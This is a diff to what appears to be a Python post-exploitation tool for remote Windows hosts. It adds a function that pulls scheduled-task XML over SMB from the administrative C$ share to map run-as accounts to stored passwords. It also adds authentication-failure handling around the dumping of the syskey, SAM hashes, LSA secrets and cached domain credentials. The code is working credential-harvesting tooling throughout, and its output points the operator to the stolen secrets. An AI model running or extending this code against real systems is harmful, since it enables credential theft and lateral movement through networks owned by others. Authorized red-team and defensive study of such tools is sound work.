@@ -1059,6 +1059,99 @@ def _dump_sccm_naa(host: str, auth: list, masterkeys: dict, out: list, verbose: 
         return
 
 
+# ── Task Scheduler run-as credential visibility ───────────────────────────────
+
+def _dump_task_scheduler(host: str, auth: list, workdir: str, out: list,
+                         verbose: bool = False):
+    """Pull task XMLs via SMB, report tasks with stored run-as credentials.
+
+    Passwords are NOT separately encrypted here — they land in LSA secrets
+    (_SC_ entries, already dumped by --lsa) or in Credential Manager blobs
+    (already decrypted by --dpapi).  This function shows the task-to-account
+    mapping so the operator knows which LSA/CredMan entry belongs to what task.
+    """
+    import xml.etree.ElementTree as ET
+
+    tasks_unc  = rf'\\{host}\C$\Windows\System32\Tasks'
+    local_root = os.path.join(workdir, 'tasks')
+    os.makedirs(local_root, exist_ok=True)
+
+    # Recursive listing: walk up to 6 levels deep (tasks nest by folder path)
+    def _ls_r(unc: str, depth: int = 0) -> list[str]:
+        if depth > 6:
+            return []
+        entries = _smb_ls(unc, auth, 0, verbose)
+        files   = []
+        for e in entries:
+            name = e.split('\\')[-1]
+            if not name or name in ('.', '..'):
+                continue
+            child = unc + '\\' + name
+            # Task XML files have no extension on disk
+            if '.' not in name:
+                # Could be a folder or a task file — pull and try to parse
+                files.append(child)
+            else:
+                # Folders that look like task category dirs
+                files.extend(_ls_r(child, depth + 1))
+        return files
+
+    all_paths = _ls_r(tasks_unc)
+
+    # NS used in task XML files
+    _NS = '{http://schemas.microsoft.com/windows/2004/02/mit/task}'
+
+    interesting = []  # list of (task_name, run_as_user, logon_type)
+
+    for remote_path in all_paths:
+        task_name = remote_path.replace(tasks_unc, '').lstrip('\\')
+        local     = os.path.join(local_root, task_name.replace('\\', '_'))
+        if not _smb_pull_file(remote_path, local, auth, verbose):
+            continue
+        try:
+            data = open(local, 'rb').read()
+            # Task files are UTF-16-LE with BOM or UTF-8
+            try:
+                text = data.decode('utf-16-le')
+                if text.startswith('\ufeff'):
+                    text = text[1:]
+            except UnicodeDecodeError:
+                text = data.decode('utf-8', errors='replace')
+
+            root = ET.fromstring(text)
+            # Look under Principals/Principal
+            for principal in root.iter(f'{_NS}Principal'):
+                uid_el     = principal.find(f'{_NS}UserId')
+                logon_el   = principal.find(f'{_NS}LogonType')
+                uid        = (uid_el.text   or '').strip() if uid_el   is not None else ''
+                logon_type = (logon_el.text or '').strip() if logon_el is not None else ''
+
+                # Skip SYSTEM / built-in service accounts
+                skip = {'SYSTEM', 'NT AUTHORITY\\SYSTEM', 'NT AUTHORITY\\LOCALSERVICE',
+                        'NT AUTHORITY\\NETWORKSERVICE', 'S-1-5-18', 'S-1-5-19', 'S-1-5-20',
+                        'LOCAL SERVICE', 'NETWORK SERVICE', ''}
+                if uid.upper() in {s.upper() for s in skip}:
+                    continue
+                # InteractiveToken = no stored password; Password/S4U = stored
+                if logon_type.lower() not in ('password', 's4u', ''):
+                    continue
+                interesting.append((task_name, uid, logon_type or 'unknown'))
+        except Exception:
+            pass
+
+    if not interesting:
+        return
+
+    out.append('\n[*] Scheduled Task Run-As Credentials')
+    out.append('-' * 60)
+    out.append('    Passwords in LSA secrets (_SC_<task>) or Credential Manager blobs above')
+    for task_name, uid, logon_type in sorted(interesting):
+        out.append(f'  Task:      {task_name}')
+        out.append(f'  RunAs:     {uid}')
+        out.append(f'  LogonType: {logon_type}')
+        out.append('')
+
+
 # ── DPAPI: Browser passwords ──────────────────────────────────────────────────
 
 _KEY_FAIL_HINT = {
@@ -1679,6 +1772,7 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
         _dump_wam_tokens(files['wam_tokens'],    masterkeys, out)
         _dump_rdcman(files['rdcman'],            masterkeys, out)
         _dump_sccm_naa(host, auth, masterkeys, out, verbose)
+        _dump_task_scheduler(host, auth, workdir, out, verbose)
         _dump_credman(files['credman'], masterkeys, out)
 
     finally:
@@ -1860,47 +1954,66 @@ def dump_host(host, args, auth):
         _dump_ntds(host, args, auth, sec_ntds, nt_hashes, verbose=args.verbose)
     else:
         need_syskey = args.sam or args.lsa or args.cache
-        _smb_conn = _smb_connect(host, args) if need_syskey else None
+        _smb_conn   = _smb_connect(host, args) if need_syskey else None
+        _reg_auth_failed = False
+        _reg_fail_rc     = 0
+
         with _RemoteRegistry(_smb_conn, verbose=args.verbose):
             if need_syskey:
                 if args.verbose:
                     print(f'[*] {host}: syskey', file=sys.stderr)
-                sk_raw = _reg('syskey', auth, host, ['-BackupSemantics'], verbose=args.verbose)
-                syskey_line = f'[*] SYSKEY: {_syskey_from_output(sk_raw)}'
-                if args.sam:   sec_sam.append(syskey_line)
-                if args.lsa:   sec_lsa.append(syskey_line)
-                if args.cache: sec_cache.append(syskey_line)
+                sk_raw, sk_rc = _run(REG_BIN, 'syskey', auth,
+                                     [host, '-BackupSemantics'],
+                                     verbose=args.verbose)
+                if sk_rc != 0 and not sk_raw.strip():
+                    _reg_auth_failed = True
+                    _reg_fail_rc     = sk_rc
+                else:
+                    syskey_line = f'[*] SYSKEY: {_syskey_from_output(sk_raw)}'
+                    if args.sam:   sec_sam.append(syskey_line)
+                    if args.lsa:   sec_lsa.append(syskey_line)
+                    if args.cache: sec_cache.append(syskey_line)
 
-            if args.sam:
-                if args.verbose:
-                    print(f'[*] {host}: SAM hashes', file=sys.stderr)
-                sam_raw = _reg('dumpsam', auth, host,
-                               ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
-                               verbose=args.verbose)
-                sam_hashes = _dump_sam(host, sam_raw, sec_sam)
+            if not _reg_auth_failed:
+                if args.sam:
+                    if args.verbose:
+                        print(f'[*] {host}: SAM hashes', file=sys.stderr)
+                    sam_raw = _reg('dumpsam', auth, host,
+                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
+                                   verbose=args.verbose)
+                    sam_hashes = _dump_sam(host, sam_raw, sec_sam)
 
-            nlkm_hex = None
-            if args.lsa:
-                if args.verbose:
-                    print(f'[*] {host}: LSA secrets', file=sys.stderr)
-                lsa_raw = _reg('dumplsasecrets', auth, host,
-                               ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
-                               verbose=args.verbose)
-                nlkm_hex, dpapi_system_hex = _dump_lsa(host, lsa_raw, auth, sec_lsa,
-                                                        verbose=args.verbose)
+                nlkm_hex = None
+                if args.lsa:
+                    if args.verbose:
+                        print(f'[*] {host}: LSA secrets', file=sys.stderr)
+                    lsa_raw = _reg('dumplsasecrets', auth, host,
+                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
+                                   verbose=args.verbose)
+                    nlkm_hex, dpapi_system_hex = _dump_lsa(host, lsa_raw, auth, sec_lsa,
+                                                            verbose=args.verbose)
 
-            if args.cache:
-                if args.verbose:
-                    print(f'[*] {host}: credential cache', file=sys.stderr)
-                cache_raw = _reg('list', auth, host,
-                                 ['-BackupSemantics', r'HKLM\SECURITY\Cache',
-                                  '-IncludeData', '-ConsoleOutputStyle', 'Csv'],
-                                 verbose=args.verbose)
-                _dump_cache(host, cache_raw, nlkm_hex, sec_cache)
+                if args.cache:
+                    if args.verbose:
+                        print(f'[*] {host}: credential cache', file=sys.stderr)
+                    cache_raw = _reg('list', auth, host,
+                                     ['-BackupSemantics', r'HKLM\SECURITY\Cache',
+                                      '-IncludeData', '-ConsoleOutputStyle', 'Csv'],
+                                     verbose=args.verbose)
+                    _dump_cache(host, cache_raw, nlkm_hex, sec_cache)
 
         if _smb_conn:
             try: _smb_conn.logoff()
             except Exception: pass
+
+        if _reg_auth_failed:
+            msg = (f'[!] {host} — authentication failed '
+                   f'(Reg returned no output, rc={_reg_fail_rc})\n'
+                   f'    Kerberos: ccache must have a cifs/ SPN — '
+                   f'getST.py -spn cifs/{host} ...\n'
+                   f'    Password/hash: verify credentials and network access')
+            print(msg, file=sys.stderr)
+            return 'auth_failed', []
 
     if getattr(args, 'dpapi', False):
         _dump_dpapi(host, args, auth, dpapi_system_hex, sam_hashes, sec_dpapi,
